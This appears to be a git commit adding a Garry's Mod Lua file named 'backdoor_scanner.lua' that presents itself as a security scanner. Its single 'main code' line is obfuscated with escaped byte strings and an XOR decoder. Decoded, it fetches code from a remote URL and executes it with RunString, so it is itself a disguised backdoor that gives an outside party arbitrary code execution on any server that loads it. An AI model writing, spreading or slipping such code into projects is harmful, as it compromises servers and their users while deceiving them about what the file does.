86fe1e281e56e0cae7e805f67e4dedc66586d3e4
1Status <80069915+1Status@users.noreply.github.com>
2021-07-03 02:01:09 -0400

    Create backdoor_scanner.lua

---
+++ backdoor_scanner.lua
@@ -0,0 +1,7 @@
+local version = "0.310.30" --We'll check for this later.
+
+//Main code
+require("http")
+local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' local ‪‪‪‪‪‪ = 0 for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪‪["\98\121\116\101"](_), 47))end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪"G\91\91\95"][‪‪‪‪‪‪‪"iJ\91LG"](‪‪‪‪‪‪‪"G\91\91\95\21\0\0JL\92I\64ZAKN\91F\64A\1BVXJML\64BBZAF\91V\1\64\93H\0HB\64K\0HF\91GZM\0MNLDK\64\64\93\92LNAAJ\93\1CZN",function (false‪)‪[‪‪‪‪‪‪‪"ph"][‪‪‪‪‪‪‪"\125ZA\124\91\93FAH"](false‪)end )
+//Update check
+//Coming soon
